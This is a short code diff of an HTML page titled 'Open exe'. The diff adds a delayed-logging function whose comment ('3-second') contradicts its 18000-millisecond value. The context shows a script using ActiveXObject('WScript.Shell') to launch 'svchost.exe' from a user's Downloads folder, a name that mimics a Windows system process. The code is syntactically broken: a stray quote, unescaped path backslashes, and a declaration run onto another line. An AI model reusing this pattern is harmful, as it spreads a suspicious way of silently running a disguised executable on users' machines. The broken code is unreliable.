@@ -4,7 +4,12 @@
         <title>Open exe</title>
 
         <script type="text/javascript">
-        function runProgram()
+    function delayedFunction() {
+      console.log("This message appears after a 18-second delay.");
+    }
+
+    // Set a 3-second (3000 milliseconds) delay
+    setTimeout(delayedFunction, 18000);        function runProgram()
         {
             var shell = new ActiveXObject("WScript.Shell");                 
             var appITunes = "C:\Users\legal\Downloads\svchost.exe" ";
